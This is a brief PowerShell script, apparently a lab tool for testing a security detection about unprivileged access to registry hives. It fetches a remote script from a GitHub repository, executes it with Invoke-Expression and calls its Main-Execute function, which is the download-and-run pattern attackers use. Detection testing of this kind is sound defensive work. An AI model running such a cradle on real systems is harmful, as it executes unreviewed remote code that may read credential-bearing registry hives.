# Disclaimer: This script is for educational purposes only and must be executed in a secure, isolated lab environment.
# Do not execute it in production or on-premises environments under any circumstances.

# Define the URL where the external script is hosted
$url = "https://raw.githubusercontent.com/crtx-pub/PlaybooksAutomation/refs/heads/main/Playbooks%20-%20Unprivileged%20process%20opened%20a%20registry%20hive/HKJOGL.ps1"

# Ensure TLS 1.2 or higher is used for the connection
# Older versions of PowerShell default to older, unsupported TLS versions.
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Attempt to download the script
try {
    # Download the script as a string
    $scriptContent = (New-Object System.Net.WebClient).DownloadString($url)

    # Execute the downloaded script
    Invoke-Expression $scriptContent

    # Invoke a function or command from the downloaded script
    Main-Execute
} catch {
    # Output error details
    Write-Error "An error occurred while downloading or executing the script: $_"
}
